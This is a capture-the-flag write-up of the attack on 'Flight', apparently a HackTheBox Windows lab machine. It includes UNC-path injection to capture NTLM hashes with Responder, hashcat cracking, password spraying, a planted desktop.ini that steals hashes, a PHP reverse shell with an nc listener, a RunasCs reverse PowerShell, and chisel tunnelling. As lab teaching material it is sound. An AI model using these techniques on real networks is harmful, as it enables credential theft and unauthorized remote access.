Checking open ports with nmap:

nmap -p- $IP

Host is up (0.30s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws

We check the website adding the IP to our /etc/hosts file. Nothing interesting was found on the main website.
We run gobuster:
gobuster dir -u http://flight.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

obuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://flight.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/02/12 01:00:21 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 333] [--> http://flight.htb/images/]
/Images               (Status: 301) [Size: 333] [--> http://flight.htb/Images/]
/css                  (Status: 301) [Size: 330] [--> http://flight.htb/css/]
/js                   (Status: 301) [Size: 329] [--> http://flight.htb/js/]
/examples             (Status: 503) [Size: 399]
/licenses             (Status: 403) [Size: 418]
/IMAGES               (Status: 301) [Size: 333] [--> http://flight.htb/IMAGES/]
/%20                  (Status: 403) [Size: 299]
/*checkout*           (Status: 403) [Size: 299]
/CSS                  (Status: 301) [Size: 330] [--> http://flight.htb/CSS/]
/JS                   (Status: 301) [Size: 329] [--> http://flight.htb/JS/]
/phpmyadmin           (Status: 403) [Size: 418]

Then we started checking for subdomains using wfuzz

wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://flight.htb" -H "Host: FUZZ.flight.htb" but we get a lot of responses so we use:

wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://flight.htb" -H "Host: FUZZ.flight.htb" --hl 154 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://flight.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                           
=====================================================================

000000624:   200        90 L     412 W      3996 Ch     "school" 

As we found the subdomain "school" we continue to enumerate "school.flight.htb" and if we navigate through the site we have a parameter "view".
http://school.flight.htb/index.php?view=home.html

so we check for an LFI.

http://school.flight.htb/index.php?view=../../../../../../../../etc/passwd 

getting an error message of 

"Suspicious Activity Blocked!
Incident will be reported"

After research for LFI on a windows machine we got to the conclusion that we can check for the website source code and see if we can bypass the filters.
Knowing that it is an Apache server the code is inside the C:/xampp/htdocs directory, so we check at C:/xampp/htdocs/school.flight.htb/index.php and get our source code

<?php

ini_set('display_errors', 0);
error_reporting(E_ERROR | E_WARNING | E_PARSE); 

if(isset($_GET['view'])){
$file=$_GET['view'];
if ((strpos(urldecode($_GET['view']),'..')!==false)||
    (strpos(urldecode(strtolower($_GET['view'])),'filter')!==false)||
    (strpos(urldecode($_GET['view']),'\\')!==false)||
    (strpos(urldecode($_GET['view']),'htaccess')!==false)||
    (strpos(urldecode($_GET['view']),'.shtml')!==false)
){
    echo "<h1>Suspicious Activity Blocked!";
    echo "<h3>Incident will be reported</h3>\r\n";
}else{
    echo file_get_contents($_GET['view']);	
}
}else{
    echo file_get_contents("C:\\xampp\\htdocs\\school.flight.htb\\home.html");
}

The url validation prevents us from doing LFI. But we can use this code to force the service to fetch a remote source using Windows network share syntax: //ip>/<share> attempt to capture the hash of a service and try crackingit with hashcat.

For that we use Responder tool
Responder is an inbuilt Kali Linux tool for Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) that responds to specific NetBIOS queries based on the file server request.

responder -I tun0 -wPv to our attacking machine and listenint for events.
http://school.flight.htb/index.php?view=//our-ip/attack

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:30866f304dbafe

hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt and we get the password.


Perform enum on SMB using the obtained credentials

crackmapexec smb flight.htb -u svc_apache -p '*********' --users  and get a list of users
we bruteforce the users with the above password to check if anyone is using the same password as svc_apache

SMB    flight.htb      445    G0     [+] flight.htb\S.Moon:S*********3

After research we find that we can use impacket for to search for a writable share
https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d

we use "impacket-psexec flight.htb/S.moon@flight.htb"

Password:
[*] Requesting shares on g0.flight.htb.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[*] Found writable share Shared

https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini
[.ShellClassInfo]
IconResource=\\<ip>\something

After creating the file desktop.ini, we put it in the smb folder Shared:

smbclient //flight.htb/shared -U S.moon
Password for [WORKGROUP\S.moon]:
Try "help" to get a list of possible commands.
smb: \> put desktop.ini

while also we open a Responder listener:
Responder -I tun0 -wPv


[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::"hash"

After that we use hashcat to crack c.bum password:

hashcat -a 0 -m 5600 hash_c.bum /usr/share/wordlists/rockyou.txt --show
Tikkycoll_431012284

After get this cred, we can login into the Web folder with smb service.

smbclient //flight.htb/Web -U c.bum

then i can upload a reverse shell into th flight.htb share
open a listener to our attacking machine nc -lvnp 9001

access flight.htb/reverse_shell.php and get the reverse shell. 

we need to go from svc_apache to c.bum user session

https://github.com/antonioCoco/RunasCs/releases 

RunasCs.exe c.bum Password powershell -r ip:port (to get a powershell session in another listener on our machine)

nc -lvnp port

and we get a session as c.bum user and the user.txt.
netstat -a

we see a port 8000 open so we use chisel to interact with it in our attacking machine.
https://infinitelogins.com/2020/12/11/tunneling-through-windows-machines-with-chisel/

#client
.\chisel.exe client IP:9999 R:8000:127.0.0.1:8000

#Server:
chisel server --reverse -p 9999

After accesing the website and playing with it we see from errors that the website is written in ASP.NET in which we can try to upload an .aspx webshell to get a session.
